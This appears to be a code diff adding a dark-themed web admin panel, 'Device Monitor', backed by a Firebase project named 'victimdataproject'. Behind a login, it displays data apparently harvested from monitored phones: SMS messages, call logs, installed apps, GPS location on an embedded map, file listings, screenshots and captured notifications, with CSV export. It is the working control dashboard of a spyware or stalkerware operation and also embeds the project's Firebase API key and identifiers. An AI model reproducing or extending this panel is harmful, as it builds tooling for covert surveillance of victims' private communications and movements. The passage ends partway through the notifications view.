@@ -1,0 +1,1127 @@
+<!DOCTYPE html>
+<html lang="en" class="dark">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Admin Panel - Device Monitor</title>
+    
+    <!-- TailwindCSS CDN -->
+    <script src="https://cdn.tailwindcss.com"></script>
+    
+    <!-- Font Awesome CDN -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
+
+    <!-- Custom Styles -->
+    <style>
+        /* Custom scrollbar for a better dark mode experience */
+        ::-webkit-scrollbar { width: 8px; }
+        ::-webkit-scrollbar-track { background: #1f2937; }
+        ::-webkit-scrollbar-thumb { background: #4b5563; border-radius: 4px; }
+        ::-webkit-scrollbar-thumb:hover { background: #6b7280; }
+        
+        /* Sidebar transition */
+        #sidebar { transition: width 0.3s ease-in-out; }
+        
+        /* Page content fade-in animation */
+        .content-page { animation: fadeIn 0.5s ease-in-out; }
+        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
+
+        /* For collapsible sidebar text hiding */
+        .sidebar-text { transition: opacity 0.2s ease, visibility 0.2s ease; }
+        #sidebar.collapsed .sidebar-text { opacity: 0; visibility: hidden; white-space: nowrap; }
+        #sidebar.collapsed { width: 4.5rem; } /* 72px */
+        #sidebar:not(.collapsed) { width: 16rem; } /* 256px */
+
+        #main-content { transition: margin-left 0.3s ease-in-out; }
+        @media (min-width: 768px) {
+            #main-content.sidebar-open { margin-left: 16rem; }
+            #main-content.sidebar-collapsed { margin-left: 4.5rem; }
+        }
+    </style>
+</head>
+<body class="bg-gray-900 text-gray-200 font-sans">
+
+    <!-- LOGIN PAGE -->
+    <div id="login-page" class="flex items-center justify-center min-h-screen bg-gray-900">
+        <div class="w-full max-w-md p-8 space-y-6 bg-gray-800 rounded-lg shadow-lg">
+            <div class="text-center">
+                <i class="fas fa-user-shield fa-3x text-cyan-400"></i>
+                <h1 class="mt-4 text-3xl font-bold tracking-tight text-white">Admin Panel Login</h1>
+                <p class="mt-2 text-sm text-gray-400">Please sign in to continue</p>
+            </div>
+            <form id="login-form" class="space-y-6">
+                <div>
+                    <label for="email" class="text-sm font-medium text-gray-300">Email</label>
+                    <div class="mt-1 relative">
+                        <span class="absolute inset-y-0 left-0 flex items-center pl-3">
+                            <i class="fas fa-envelope text-gray-500"></i>
+                        </span>
+                        <input id="email" name="email" type="email" autocomplete="email" required class="w-full pl-10 pr-3 py-2 bg-gray-700 border border-gray-600 rounded-md placeholder-gray-400 focus:outline-none focus:ring-2 focus:ring-cyan-500 focus:border-cyan-500">
+                    </div>
+                </div>
+                <div>
+                    <label for="password" class="text-sm font-medium text-gray-300">Password</label>
+                    <div class="mt-1 relative">
+                        <span class="absolute inset-y-0 left-0 flex items-center pl-3">
+                            <i class="fas fa-lock text-gray-500"></i>
+                        </span>
+                        <input id="password" name="password" type="password" autocomplete="current-password" required class="w-full pl-10 pr-3 py-2 bg-gray-700 border border-gray-600 rounded-md placeholder-gray-400 focus:outline-none focus:ring-2 focus:ring-cyan-500 focus:border-cyan-500">
+                    </div>
+                </div>
+                <div id="login-error" class="text-sm text-red-400 hidden"></div>
+                <button type="submit" class="w-full py-2 px-4 bg-cyan-600 hover:bg-cyan-700 text-white font-semibold rounded-md shadow-md focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-offset-gray-800 focus:ring-cyan-500 transition duration-300">
+                    Sign In
+                </button>
+            </form>
+        </div>
+    </div>
+
+    <!-- MAIN APPLICATION -->
+    <div id="app" class="hidden">
+        <!-- Sidebar -->
+        <aside id="sidebar" class="fixed top-0 left-0 h-full bg-gray-800 shadow-lg z-30 md:w-64">
+            <div class="flex items-center justify-between p-4 border-b border-gray-700 h-16">
+                <h1 class="text-xl font-bold text-white flex items-center gap-3">
+                    <i class="fas fa-shield-halved text-cyan-400"></i>
+                    <span class="sidebar-text">Admin Panel</span>
+                </h1>
+                 <button id="sidebar-toggle" class="p-2 rounded-md hover:bg-gray-700 focus:outline-none focus:ring-2 focus:ring-gray-500">
+                    <i class="fas fa-bars text-white"></i>
+                </button>
+            </div>
+            <nav id="sidebar-nav" class="p-2 space-y-1">
+                <!-- Navigation links will be dynamically inserted here -->
+            </nav>
+        </aside>
+
+        <!-- Main Content -->
+        <div id="main-content" class="relative md:ml-64">
+             <!-- Topbar -->
+            <header class="sticky top-0 bg-gray-800/80 backdrop-blur-sm border-b border-gray-700 shadow-sm z-20">
+                <div class="flex items-center justify-between h-16 px-4 sm:px-6">
+                    <div id="device-selector-container" class="flex items-center gap-4">
+                        <i class="fas fa-mobile-screen-button text-xl text-gray-400"></i>
+                        <select id="device-selector" class="bg-gray-700 border border-gray-600 rounded-md py-1.5 px-3 text-white focus:outline-none focus:ring-2 focus:ring-cyan-500">
+                            <!-- Options populated dynamically -->
+                        </select>
+                    </div>
+                    <div class="flex items-center gap-4">
+                        <span id="admin-email" class="text-sm text-gray-400 hidden sm:block"></span>
+                        <button id="logout-button" class="flex items-center gap-2 px-3 py-1.5 text-sm bg-red-600 hover:bg-red-700 rounded-md transition duration-200">
+                            <i class="fas fa-sign-out-alt"></i>
+                            <span class="hidden md:inline">Logout</span>
+                        </button>
+                    </div>
+                </div>
+            </header>
+            
+            <main id="content-container" class="p-4 sm:p-6">
+                <!-- Page content will be rendered here -->
+            </main>
+        </div>
+    </div>
+    
+    <!-- Fullscreen Image Viewer Modal -->
+    <div id="image-viewer-modal" class="fixed inset-0 bg-black/80 z-50 hidden items-center justify-center">
+        <div class="relative max-w-4xl max-h-[90vh]">
+            <img id="fullscreen-image" src="" alt="Fullscreen Screenshot" class="max-w-full max-h-[90vh] object-contain rounded-lg">
+            <button id="close-modal-button" class="absolute -top-4 -right-4 text-white bg-red-600 rounded-full w-8 h-8 flex items-center justify-center text-xl">×</button>
+        </div>
+    </div>
+
+
+    <!-- Firebase SDKs -->
+    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-auth-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>
+
+    <!-- Main Application Script -->
+    <script>
+    (function() {
+        // --- 1. FIREBASE CONFIGURATION ---
+        // IMPORTANT: Replace with your actual Firebase project configuration.
+        const firebaseConfig = {
+            apiKey: "AIzaSyADpoTdgf5MZn7yPplT_cSRA8fngJvjibw",
+            authDomain: "victimdataproject.firebaseapp.com",
+            databaseURL: "https://victimdataproject-default-rtdb.firebaseio.com/",
+            projectId: "victimdataproject",
+            storageBucket: "victimdataproject.appspot.com",
+            messagingSenderId: "938788267301",
+            appId: "1:938788267301:web:cdcff391160dce48fa66cc"
+        };
+
+        // --- 2. INITIALIZE FIREBASE & SERVICES ---
+        firebase.initializeApp(firebaseConfig);
+        const auth = firebase.auth();
+        const db = firebase.database();
+
+        // --- 3. GLOBAL STATE & CONSTANTS ---
+        const state = {
+            currentUser: null,
+            devices: {},
+            selectedDeviceUid: null,
+            currentView: 'dashboard',
+            statusInterval: null,
+        };
+        const OFFLINE_THRESHOLD = 5 * 60 * 1000; // 5 minutes
+
+        // --- 4. DOM ELEMENT SELECTORS ---
+        const loginPage = document.getElementById('login-page');
+        const appPage = document.getElementById('app');
+        const loginForm = document.getElementById('login-form');
+        const loginError = document.getElementById('login-error');
+        const adminEmail = document.getElementById('admin-email');
+        const logoutButton = document.getElementById('logout-button');
+        const contentContainer = document.getElementById('content-container');
+        const deviceSelector = document.getElementById('device-selector');
+        const deviceSelectorContainer = document.getElementById('device-selector-container');
+        const sidebarNav = document.getElementById('sidebar-nav');
+        const sidebar = document.getElementById('sidebar');
+        const sidebarToggle = document.getElementById('sidebar-toggle');
+        const mainContent = document.getElementById('main-content');
+        
+        // --- 5. AUTHENTICATION LOGIC ---
+        auth.onAuthStateChanged(user => {
+            if (user) {
+                // User is signed in
+                state.currentUser = user;
+                loginPage.classList.add('hidden');
+                appPage.classList.remove('hidden');
+                adminEmail.textContent = user.email;
+                initializeApp();
+            } else {
+                // User is signed out
+                state.currentUser = null;
+                appPage.classList.add('hidden');
+                loginPage.classList.remove('hidden');
+                if (state.statusInterval) clearInterval(state.statusInterval);
+                cleanupApp();
+            }
+        });
+
+        loginForm.addEventListener('submit', (e) => {
+            e.preventDefault();
+            const email = loginForm.email.value;
+            const password = loginForm.password.value;
+            auth.signInWithEmailAndPassword(email, password)
+                .catch(error => {
+                    loginError.textContent = getAuthErrorMessage(error.code);
+                    loginError.classList.remove('hidden');
+                });
+        });
+
+        logoutButton.addEventListener('click', () => {
+            auth.signOut();
+        });
+
+        // --- 6. APPLICATION INITIALIZATION & CLEANUP ---
+        function initializeApp() {
+            console.log("App Initializing...");
+            setupSidebar();
+            listenForDeviceData();
+            setupEventListeners();
+            // Check device status every 30 seconds
+            if(state.statusInterval) clearInterval(state.statusInterval);
+            state.statusInterval = setInterval(updateDeviceStatuses, 30000);
+        }
+
+        function cleanupApp() {
+            contentContainer.innerHTML = '';
+            deviceSelector.innerHTML = '';
+            sidebarNav.innerHTML = '';
+            state.devices = {};
+            state.selectedDeviceUid = null;
+            state.currentView = 'dashboard';
+        }
+        
+        // --- 7. FIREBASE DATA LISTENERS ---
+        function listenForDeviceData() {
+            const devicesRef = db.ref('devices');
+            devicesRef.on('value', snapshot => {
+                const data = snapshot.val();
+                state.devices = data || {};
+                console.log("Firebase data updated:", state.devices);
+                
+                // If the currently selected device was removed, reset selection
+                if (state.selectedDeviceUid && !state.devices[state.selectedDeviceUid]) {
+                    state.selectedDeviceUid = null;
+                }
+                
+                updateDeviceSelector();
+                renderCurrentView();
+            }, error => {
+                console.error("Firebase Read Failed:", error);
+                contentContainer.innerHTML = `<div class="text-red-400">Error fetching data from Firebase. Check console for details.</div>`;
+            });
+        }
+        
+        // --- 8. UI RENDERING & DYNAMIC CONTENT ---
+        function renderCurrentView() {
+            if (!state.currentUser) return;
+            
+            updateSidebarActiveState();
+            
+            const showSelector = state.currentView !== 'dashboard' && state.currentView !== 'device_list';
+            deviceSelectorContainer.style.display = showSelector ? 'flex' : 'none';
+
+            // Main view router
+            switch(state.currentView) {
+                case 'dashboard':
+                    renderDashboard();
+                    break;
+                case 'device_list':
+                    renderDeviceList();
+                    break;
+                default:
+                    if (state.selectedDeviceUid) {
+                        renderDetailPage(state.currentView);
+                    } else if (Object.keys(state.devices).length > 0) {
+                        // If no device is selected, but devices exist, select the first one
+                        state.selectedDeviceUid = Object.keys(state.devices)[0];
+                        updateDeviceSelector();
+                        renderDetailPage(state.currentView);
+                    } else {
+                        renderEmptyStateForDetailPages();
+                    }
+                    break;
+            }
+        }
+        
+        function renderDetailPage(view) {
+            const deviceData = state.devices[state.selectedDeviceUid];
+            if (!deviceData) {
+                renderEmptyStateForDetailPages();
+                return;
+            }
+            switch(view) {
+                case 'sms': renderSmsLogs(deviceData.sms || {}); break;
+                case 'calls': renderCallLogs(deviceData.calls || {}); break;
+                case 'apps': renderInstalledApps(deviceData.apps || {}); break;
+                case 'battery': renderBatteryInfo(deviceData.battery || {}); break;
+                case 'location': renderLocation(deviceData.location || {}); break;
+                case 'files': renderFileLogs(deviceData.files || {}); break;
+                case 'screenshots': renderScreenshots(deviceData.screenshots || {}); break;
+                case 'notifications': renderNotifications(deviceData.notifications || {}); break;
+                case 'info': renderDeviceInfo(deviceData.info || {}, state.selectedDeviceUid); break;
+                default:
+                    contentContainer.innerHTML = '<h2>Page not found</h2>';
+            }
+        }
+
+        function renderDashboard() {
+            const deviceUIDs = Object.keys(state.devices);
+            const totalDevices = deviceUIDs.length;
+            let onlineDevices = 0;
+            let totalSms = 0, totalCalls = 0, totalScreenshots = 0, totalApps = 0;
+
+            deviceUIDs.forEach(uid => {
+                const device = state.devices[uid];
+                if (isDeviceOnline(device.status)) {
+                    onlineDevices++;
+                }
+                totalSms += Object.keys(device.sms || {}).length;
+                totalCalls += Object.keys(device.calls || {}).length;
+                totalScreenshots += Object.keys(device.screenshots || {}).length;
+                totalApps += Object.keys(device.apps || {}).length;
+            });
+            
+            contentContainer.innerHTML = `
+                <div class="content-page">
+                    <h2 class="text-3xl font-bold text-white mb-6">Dashboard</h2>
+                    <div class="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-6">
+                        ${createStatCard('Total Devices', totalDevices, 'fas fa-mobile-alt', 'bg-blue-500')}
+                        ${createStatCard('Online Devices', onlineDevices, 'fas fa-wifi', 'bg-green-500')}
+                        ${createStatCard('Total SMS Logs', totalSms.toLocaleString(), 'fas fa-comment-dots', 'bg-yellow-500')}
+                        ${createStatCard('Total Call Logs', totalCalls.toLocaleString(), 'fas fa-phone', 'bg-purple-500')}
+                        ${createStatCard('Installed Apps', totalApps.toLocaleString(), 'fab fa-android', 'bg-indigo-500')}
+                        ${createStatCard('Screenshots Taken', totalScreenshots.toLocaleString(), 'fas fa-camera', 'bg-pink-500')}
+                    </div>
+                </div>
+            `;
+        }
+
+        function createStatCard(title, value, icon, color) {
+            return `
+                <div class="bg-gray-800 rounded-lg shadow-lg p-6 flex items-center justify-between hover:scale-105 transform transition-transform duration-300">
+                    <div>
+                        <p class="text-sm font-medium text-gray-400">${title}</p>
+                        <p class="text-3xl font-bold text-white">${value}</p>
+                    </div>
+                    <div class="text-white rounded-full ${color} p-4">
+                        <i class="${icon} fa-2x"></i>
+                    </div>
+                </div>
+            `;
+        }
+
+        function renderDeviceList() {
+             contentContainer.innerHTML = `
+                <div class="content-page">
+                    <div class="bg-gray-800 rounded-lg shadow-lg">
+                        <div class="p-4 border-b border-gray-700 flex justify-between items-center">
+                            <h2 class="text-xl font-bold text-white">Connected Devices</h2>
+                             <div class="relative">
+                                <span class="absolute inset-y-0 left-0 flex items-center pl-3">
+                                    <i class="fas fa-search text-gray-500"></i>
+                                </span>
+                                <input type="text" id="device-search" placeholder="Search by name or UID..." class="w-full pl-10 pr-4 py-2 bg-gray-700 border border-gray-600 rounded-md focus:outline-none focus:ring-2 focus:ring-cyan-500">
+                            </div>
+                        </div>
+                        <div class="overflow-x-auto">
+                            <table class="min-w-full text-sm text-left text-gray-300">
+                                <thead class="bg-gray-700 text-xs uppercase font-medium">
+                                    <tr>
+                                        <th scope="col" class="px-6 py-3">Alias</th>
+                                        <th scope="col" class="px-6 py-3">UID</th>
+                                        <th scope="col" class="px-6 py-3">Status</th>
+                                        <th scope="col" class="px-6 py-3">Last Seen</th>
+                                    </tr>
+                                </thead>
+                                <tbody id="device-list-body">
+                                    <!-- Device rows will be inserted here -->
+                                </tbody>
+                            </table>
+                        </div>
+                    </div>
+                </div>
+            `;
+            
+            populateDeviceListTable();
+            document.getElementById('device-search').addEventListener('keyup', populateDeviceListTable);
+        }
+        
+        function populateDeviceListTable() {
+            const tbody = document.getElementById('device-list-body');
+            const searchTerm = document.getElementById('device-search')?.value.toLowerCase() || '';
+            if (!tbody) return;
+            
+            tbody.innerHTML = ''; // Clear existing rows
+            const deviceUIDs = Object.keys(state.devices);
+
+            if (deviceUIDs.length === 0) {
+                tbody.innerHTML = `<tr><td colspan="4" class="text-center p-6 text-gray-400">No devices connected yet.</td></tr>`;
+                return;
+            }
+
+            let filteredDevices = 0;
+            deviceUIDs.forEach(uid => {
+                const device = state.devices[uid];
+                const alias = device.info?.alias || 'Unnamed Device';
+                
+                if (!alias.toLowerCase().includes(searchTerm) && !uid.toLowerCase().includes(searchTerm)) {
+                    return; // Skip if it doesn't match search
+                }
+                
+                filteredDevices++;
+                const isOnline = isDeviceOnline(device.status);
+                
+                const row = document.createElement('tr');
+                row.className = 'bg-gray-800 border-b border-gray-700 hover:bg-gray-700/50';
+                row.innerHTML = `
+                    <td class="px-6 py-4 font-medium text-white whitespace-nowrap">
+                        <div class="flex items-center gap-2">
+                            <span class="device-alias-text">${escapeHtml(alias)}</span>
+                            <button class="edit-alias-btn text-gray-400 hover:text-cyan-400" data-uid="${uid}"><i class="fas fa-pencil-alt fa-xs"></i></button>
+                        </div>
+                    </td>
+                    <td class="px-6 py-4 text-gray-400 font-mono text-xs">${uid}</td>
+                    <td class="px-6 py-4">
+                        <span class="px-2 py-1 text-xs font-medium rounded-full ${isOnline ? 'bg-green-900 text-green-300' : 'bg-red-900 text-red-300'}">
+                            <i class="fas fa-circle fa-xs mr-1 ${isOnline ? 'animate-pulse' : ''}"></i>
+                            ${isOnline ? 'Online' : 'Offline'}
+                        </span>
+                    </td>
+                    <td class="px-6 py-4 last-seen-cell" data-timestamp="${device.status?.lastSeen || 0}">${formatLastSeen(device.status?.lastSeen)}</td>
+                `;
+                tbody.appendChild(row);
+            });
+
+            if (filteredDevices === 0) {
+                 tbody.innerHTML = `<tr><td colspan="4" class="text-center p-6 text-gray-400">No devices match your search.</td></tr>`;
+            }
+
+            // Add event listeners for the edit buttons
+            document.querySelectorAll('.edit-alias-btn').forEach(btn => {
+                btn.addEventListener('click', handleEditAlias);
+            });
+        }
+        
+        function renderGenericLogPage(title, icon, columns, data, rowRenderer, exportDataFormatter, emptyText) {
+            const dataKeys = Object.keys(data);
+            
+            contentContainer.innerHTML = `
+                <div class="content-page">
+                    <div class="bg-gray-800 rounded-lg shadow-lg">
+                        <div class="p-4 border-b border-gray-700 flex flex-wrap justify-between items-center gap-4">
+                            <h2 class="text-xl font-bold text-white flex items-center gap-3"><i class="${icon} text-cyan-400"></i> ${title} (${dataKeys.length})</h2>
+                            <div class="flex items-center gap-2">
+                                <div class="relative">
+                                     <span class="absolute inset-y-0 left-0 flex items-center pl-3"><i class="fas fa-search text-gray-500"></i></span>
+                                    <input type="text" id="log-search" placeholder="Search..." class="w-full pl-10 pr-4 py-2 bg-gray-700 border border-gray-600 rounded-md focus:outline-none focus:ring-2 focus:ring-cyan-500">
+                                </div>
+                                <button id="export-btn" class="px-4 py-2 bg-green-600 hover:bg-green-700 text-white font-semibold rounded-md flex items-center gap-2"><i class="fas fa-file-csv"></i> Export CSV</button>
+                            </div>
+                        </div>
+                        <div class="overflow-x-auto">
+                            <table class="min-w-full text-sm text-left text-gray-300">
+                                <thead class="bg-gray-700 text-xs uppercase font-medium">
+                                    <tr>
+                                        ${columns.map(col => `<th scope="col" class="px-6 py-3">${col}</th>`).join('')}
+                                    </tr>
+                                </thead>
+                                <tbody id="log-table-body"></tbody>
+                            </table>
+                        </div>
+                        <div id="pagination-controls" class="p-4 border-t border-gray-700 flex justify-between items-center"></div>
+                    </div>
+                </div>
+            `;
+            
+            const sortedData = dataKeys.map(key => ({...data[key], id: key})).sort((a,b) => (b.timestamp || b.date) - (a.timestamp || a.date));
+            
+            const setupPagination = (filteredData) => {
+                const logTableBody = document.getElementById('log-table-body');
+                const paginationControls = document.getElementById('pagination-controls');
+                if (!logTableBody || !paginationControls) return;
+
+                let currentPage = 1;
+                const rowsPerPage = 15;
+
+                function displayPage(page) {
+                    currentPage = page;
+                    logTableBody.innerHTML = '';
+                    const start = (page - 1) * rowsPerPage;
+                    const end = start + rowsPerPage;
+                    const paginatedItems = filteredData.slice(start, end);
+
+                    if (paginatedItems.length === 0) {
+                         logTableBody.innerHTML = `<tr><td colspan="${columns.length}" class="text-center p-6 text-gray-400">${filteredData.length === 0 && document.getElementById('log-search').value === '' ? emptyText : 'No results match your search.'}</td></tr>`;
+                    } else {
+                        paginatedItems.forEach(item => {
+                            logTableBody.innerHTML += rowRenderer(item);
+                        });
+                    }
+                    renderPaginationButtons();
+                }
+
+                function renderPaginationButtons() {
+                    const pageCount = Math.ceil(filteredData.length / rowsPerPage);
+                    paginationControls.innerHTML = '';
+
+                    if(pageCount <= 1) return;
+
+                    let buttonsHtml = '<div class="flex gap-1">';
+                    for (let i = 1; i <= pageCount; i++) {
+                        buttonsHtml += `<button class="px-3 py-1 rounded-md text-sm ${i === currentPage ? 'bg-cyan-600 text-white' : 'bg-gray-600 hover:bg-gray-500'}" data-page="${i}">${i}</button>`;
+                    }
+                    buttonsHtml += '</div>';
+                    paginationControls.innerHTML = `
+                        <span class="text-sm text-gray-400">Showing ${filteredData.length > 0 ? ((currentPage-1)*rowsPerPage)+1 : 0}-${Math.min(currentPage*rowsPerPage, filteredData.length)} of ${filteredData.length}</span>
+                        ${buttonsHtml}
+                    `;
+                }
+                
+                paginationControls.addEventListener('click', e => {
+                    if(e.target.tagName === 'BUTTON' && e.target.dataset.page) {
+                        displayPage(parseInt(e.target.dataset.page));
+                    }
+                });
+
+                displayPage(1);
+            };
+
+            const filterAndPaginate = () => {
+                const searchTerm = document.getElementById('log-search').value.toLowerCase();
+                const filtered = sortedData.filter(item => {
+                    return Object.values(item).some(val => 
+                        String(val).toLowerCase().includes(searchTerm)
+                    );
+                });
+                setupPagination(filtered);
+            };
+
+            filterAndPaginate();
+            document.getElementById('log-search').addEventListener('keyup', filterAndPaginate);
+            
+            document.getElementById('export-btn').addEventListener('click', () => {
+                 const csvData = sortedData.map(item => exportDataFormatter(item));
+                 const headers = Object.keys(csvData[0]);
+                 exportToCsv(`${state.currentView}_${state.selectedDeviceUid}.csv`, csvData, headers);
+            });
+        }
+        
+        function renderSmsLogs(smsData) {
+            renderGenericLogPage(
+                'SMS Logs',
+                'fas fa-comment-dots',
+                ['Sender', 'Message', 'Type', 'Date'],
+                smsData,
+                (sms) => `
+                    <tr class="bg-gray-800 border-b border-gray-700 hover:bg-gray-700/50">
+                        <td class="px-6 py-4 font-medium text-white">${escapeHtml(sms.sender)}</td>
+                        <td class="px-6 py-4 whitespace-pre-wrap max-w-sm">${escapeHtml(sms.message)}</td>
+                        <td class="px-6 py-4">
+                            <span class="px-2 py-1 text-xs capitalize rounded-md ${sms.type === 'inbox' ? 'bg-blue-900 text-blue-300' : 'bg-purple-900 text-purple-300'}">${escapeHtml(sms.type)}</span>
+                        </td>
+                        <td class="px-6 py-4 text-gray-400">${formatTimestamp(sms.timestamp)}</td>
+                    </tr>
+                `,
+                (sms) => ({
+                    sender: sms.sender,
+                    message: sms.message,
+                    type: sms.type,
+                    date: new Date(sms.timestamp).toLocaleString()
+                }),
+                'No SMS logs found for this device.'
+            );
+        }
+
+        function renderCallLogs(callData) {
+            const getIconAndColor = (type) => {
+                switch(type) {
+                    case 'incoming': return { icon: 'fa-arrow-down', color: 'text-green-400'};
+                    case 'outgoing': return { icon: 'fa-arrow-up', color: 'text-blue-400'};
+                    case 'missed': return { icon: 'fa-phone-slash', color: 'text-red-400'};
+                    default: return { icon: 'fa-question', color: 'text-gray-400'};
+                }
+            };
+            
+            renderGenericLogPage(
+                'Call Logs',
+                'fas fa-phone-volume',
+                ['Number', 'Type', 'Duration', 'Date'],
+                callData,
+                (call) => {
+                    const { icon, color } = getIconAndColor(call.type);
+                    return `
+                        <tr class="bg-gray-800 border-b border-gray-700 hover:bg-gray-700/50">
+                            <td class="px-6 py-4 font-medium text-white">${escapeHtml(call.number)}</td>
+                            <td class="px-6 py-4 capitalize ${color}"><i class="fas ${icon} mr-2"></i>${escapeHtml(call.type)}</td>
+                            <td class="px-6 py-4 text-gray-300">${formatDuration(call.duration)}</td>
+                            <td class="px-6 py-4 text-gray-400">${formatTimestamp(call.date)}</td>
+                        </tr>
+                    `;
+                },
+                (call) => ({
+                    number: call.number,
+                    type: call.type,
+                    duration_seconds: call.duration,
+                    date: new Date(call.date).toLocaleString()
+                }),
+                'No call logs found for this device.'
+            );
+        }
+
+        function renderInstalledApps(appData) {
+            renderGenericLogPage(
+                'Installed Apps',
+                'fab fa-android',
+                ['App Name', 'Package Name', 'Type'],
+                appData,
+                (app) => `
+                    <tr class="bg-gray-800 border-b border-gray-700 hover:bg-gray-700/50">
+                        <td class="px-6 py-4 font-medium text-white">${escapeHtml(app.name)}</td>
+                        <td class="px-6 py-4 text-gray-400 font-mono text-xs">${escapeHtml(app.packageName)}</td>
+                        <td class="px-6 py-4 capitalize">${escapeHtml(app.type)}</td>
+                    </tr>
+                `,
+                (app) => ({
+                    name: app.name,
+                    package: app.packageName,
+                    type: app.type
+                }),
+                'No installed apps data available.'
+            );
+        }
+
+        function renderBatteryInfo(battery) {
+            const level = battery.level || 0;
+            const isCharging = battery.isCharging || false;
+            let batteryColor;
+            if (level > 50) batteryColor = 'text-green-400';
+            else if (level > 20) batteryColor = 'text-yellow-400';
+            else batteryColor = 'text-red-400';
+
+            contentContainer.innerHTML = `
+                <div class="content-page">
+                    <h2 class="text-3xl font-bold text-white mb-6 flex items-center gap-3"><i class="fas fa-battery-full text-cyan-400"></i> Battery Status</h2>
+                    <div class="bg-gray-800 rounded-lg shadow-lg p-6 max-w-md mx-auto">
+                        <div class="flex items-center justify-between mb-4">
+                            <span class="text-lg font-medium">Battery Level</span>
+                            <span class="text-2xl font-bold ${batteryColor}">${level}%</span>
+                        </div>
+                        <div class="w-full bg-gray-700 rounded-full h-4 mb-4">
+                            <div class="bg-gradient-to-r from-cyan-500 to-blue-500 h-4 rounded-full" style="width: ${level}%"></div>
+                        </div>
+                        <div class="flex items-center justify-between mb-4">
+                            <span class="text-lg font-medium">Charging Status</span>
+                            <span class="font-semibold ${isCharging ? 'text-green-400' : 'text-yellow-400'}">
+                                <i class="fas ${isCharging ? 'fa-bolt' : 'fa-battery-empty'} mr-2"></i>
+                                ${isCharging ? 'Charging' : 'Discharging'}
+                            </span>
+                        </div>
+                        <div class="text-center text-sm text-gray-400 mt-6">
+                            Last updated: ${battery.lastUpdated ? formatTimestamp(battery.lastUpdated, true) : 'N/A'}
+                        </div>
+                    </div>
+                </div>
+            `;
+        }
+        
+        function renderLocation(location) {
+            const lat = location.latitude || 0;
+            const lon = location.longitude || 0;
+            const mapHtml = (lat && lon) 
+                ? `<iframe class="w-full h-96 rounded-lg"
+                      loading="lazy"
+                      allowfullscreen
+                      src="https://maps.google.com/maps?q=${lat},${lon}&hl=es;z=14&output=embed">
+                   </iframe>`
+                : `<div class="w-full h-96 rounded-lg bg-gray-700 flex items-center justify-center text-gray-400">No location data available.</div>`;
+
+            contentContainer.innerHTML = `
+                <div class="content-page">
+                    <h2 class="text-3xl font-bold text-white mb-6 flex items-center gap-3"><i class="fas fa-map-marker-alt text-cyan-400"></i> Last Known Location</h2>
+                    <div class="bg-gray-800 rounded-lg shadow-lg p-6">
+                        <div class="grid grid-cols-1 md:grid-cols-3 gap-4 mb-6 text-center">
+                            <div class="bg-gray-700 p-4 rounded-md">
+                                <p class="text-sm text-gray-400">Latitude</p>
+                                <p class="text-lg font-semibold text-white">${lat || 'N/A'}</p>
+                            </div>
+                            <div class="bg-gray-700 p-4 rounded-md">
+                                <p class="text-sm text-gray-400">Longitude</p>
+                                <p class="text-lg font-semibold text-white">${lon || 'N/A'}</p>
+                            </div>
+                            <div class="bg-gray-700 p-4 rounded-md">
+                                <p class="text-sm text-gray-400">Timestamp</p>
+                                <p class="text-lg font-semibold text-white">${location.timestamp ? formatTimestamp(location.timestamp, true) : 'N/A'}</p>
+                            </div>
+                        </div>
+                        ${mapHtml}
+                    </div>
+                </div>
+            `;
+        }
+
+        function renderFileLogs(fileData) {
+            renderGenericLogPage(
+                'File Logs',
+                'fas fa-folder-open',
+                ['File Name', 'Folder', 'Size', 'Extension'],
+                fileData,
+                (file) => `
+                    <tr class="bg-gray-800 border-b border-gray-700 hover:bg-gray-700/50">
+                        <td class="px-6 py-4 font-medium text-white">${escapeHtml(file.name)}</td>
+                        <td class="px-6 py-4 text-gray-300">${escapeHtml(file.folder)}</td>
+                        <td class="px-6 py-4 text-gray-400">${formatBytes(file.size)}</td>
+                        <td class="px-6 py-4"><span class="bg-gray-600 px-2 py-1 text-xs font-mono rounded-md">${escapeHtml(file.extension)}</span></td>
+                    </tr>
+                `,
+                (file) => ({
+                    name: file.name,
+                    folder: file.folder,
+                    size_bytes: file.size,
+                    extension: file.extension
+                }),
+                'No file logs found for this device.'
+            );
+        }
+
+        function renderScreenshots(screenshotData) {
+            const screenshots = Object.values(screenshotData || {}).sort((a,b) => b.timestamp - a.timestamp);
+
+            let gridHtml = '';
+            if (screenshots.length > 0) {
+                gridHtml = screenshots.map(shot => `
+                    <div class="relative group bg-gray-700 rounded-lg overflow-hidden cursor-pointer" data-url="${shot.url}">
+                        <img src="${shot.url}" alt="Screenshot thumbnail" class="w-full h-48 object-cover group-hover:opacity-70 transition-opacity">
+                        <div class="absolute inset-0 bg-black/40 flex items-center justify-center opacity-0 group-hover:opacity-100 transition-opacity">
+                            <i class="fas fa-expand fa-2x text-white"></i>
+                        </div>
+                        <div class="absolute bottom-0 left-0 right-0 p-2 bg-black/50 text-xs text-center text-gray-300">${formatTimestamp(shot.timestamp, true)}</div>
+                    </div>
+                `).join('');
+            } else {
+                gridHtml = `<p class="text-gray-400 col-span-full text-center py-10">No screenshots found for this device.</p>`;
+            }
+
+            contentContainer.innerHTML = `
+                <div class="content-page">
+                    <h2 class="text-3xl font-bold text-white mb-6 flex items-center gap-3"><i class="fas fa-camera-retro text-cyan-400"></i> Screenshots</h2>
+                    <div class="grid grid-cols-2 sm:grid-cols-3 md:grid-cols-4 lg:grid-cols-5 gap-4">
+                        ${gridHtml}
+                    </div>
+                </div>
+            `;
+            
+            document.querySelectorAll('[data-url]').forEach(el => {
+                el.addEventListener('click', () => showImageModal(el.dataset.url));
+            });
+        }
+        
+        function renderNotifications(notifData) {
+            renderGenericLogPage(
+                'Captured Notifications',
+                'fas fa-bell',
+                ['App', 'Title', 'Content', 'Time'],
+                notifData,
+                (notif) => `
+                    <tr class="bg-gray-800 border-b border-gray-700 hover:bg-gray-700/50">
+                        <td class="px-6 py-4 font-medium text-white">${escapeHtml(notif.appName)}</td>
+                        <td class="px-6 py-4 text-gray-200">${escapeHtml(notif.title)}</td>
